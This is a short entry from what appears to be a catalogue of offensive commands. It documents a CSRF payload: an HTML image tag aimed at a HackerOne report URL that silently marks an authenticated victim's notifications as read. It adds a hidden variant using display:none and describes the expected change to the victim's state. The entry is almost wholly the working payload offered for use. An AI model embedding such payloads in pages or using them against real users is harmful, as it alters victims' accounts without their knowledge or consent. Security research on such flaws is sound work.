---
id: cmd-csrf-img-001
data: '<html><img src="https://hackerone.com/reports/5315"></html>'
tags:
  - csrf
  - exploit
type: command
output: null
executor: html
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:22.760Z'
verified: false
validated: true
submitted: true
---
# csrf-img-report-load

## Command

```html
<html><img src="https://hackerone.com/reports/5315"></html>
```

## Description

This HTML snippet exploits a CSRF vulnerability by using an image tag to force a GET request to a HackerOne report URL, marking associated notifications as read when loaded by an authenticated user.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `src` | The report URL (e.g., https://hackerone.com/reports/{id}) | Yes |

## Examples

### Basic Usage

```html
<html><img src="https://hackerone.com/reports/5315"></html>
```

### Advanced Usage

Embed in a larger page:

```html
<!DOCTYPE html><html><body><img src="https://hackerone.com/reports/5315" style="display:none;"></body></html>
```

## Expected Output

The browser fetches the src URL via GET, triggering the server to mark notifications as read. No visible output in the page, but victim's notification state changes.

## Related

- [[Related Procedure|procedures/Exploit-CSRF-with-Malicious-Image-Tag]]
